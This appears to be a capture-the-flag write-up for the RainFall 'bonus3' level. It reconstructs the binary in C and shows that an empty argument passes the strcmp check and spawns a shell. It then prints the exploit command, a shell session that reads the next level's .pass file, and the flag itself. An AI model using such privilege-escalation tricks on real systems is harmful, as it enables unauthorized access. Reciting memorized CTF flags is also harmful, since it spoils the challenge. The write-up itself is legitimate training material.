# bonus3

This one is funny. I won't include any x86 ASM but directly the reconstruction in C of the program since it do not involve any kind of vulnerability. This is just a mind game :

```c
int __cdecl main(int argc, const char **argv)
{
  char buffer[132];
  FILE *fp;

  fp = fopen("/home/user/end/.pass", "r");
  memset(buffer, 0, sizeof(ptr));
  if ( !fp || argc != 2 )
    return -1;
  fread(buffer, 1u, 0x42u, fp);
  buffer[65] = 0;
  buffer[atoi(argv[1])] = 0;
  fread(&buffer[66], 1u, 0x41u, fp);
  fclose(fp);
  if ( strcmp(buffer, argv[1]) == 0 )
    execl("/bin/sh", "sh", 0);
  else
    puts(&buffer[66]);
  return 0;
}
```

This program takes a sole argument. This argument is then converted to an integer with `atoi` and is used as an index into `buffer` to write a **NUL byte**.

This is absolutly useless because the last fread encountered an **EOF**. This does not write anything into the buffer :

```c
fread(&buffer[66], 1u, 0x41u, fp);
fclose(fp);
```

Then, the program checks if the buffer and the argument are lexicographically equal by using `strcmp`, if it is, we have our shell.

My initial approach was to try to bruteforce. But this would yield to astronomical numbers of test cases : `16 ^ 99`.

This is much simpler : two empty string are equals.

If an empty string is passed to `atoi`, it returns 0, thus leading to `buffer` being an empty string. It would mean that `argv[1]` is also an empty string. So the `strcmp` check will pass ! 

```
bonus3@RainFall:~$ ./bonus3 "$(python -c 'print("\x00")')"
$ whoami
end
$ cd ../end
$ cat .pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

This last flag concludes the Rainfall CTF Challenge !
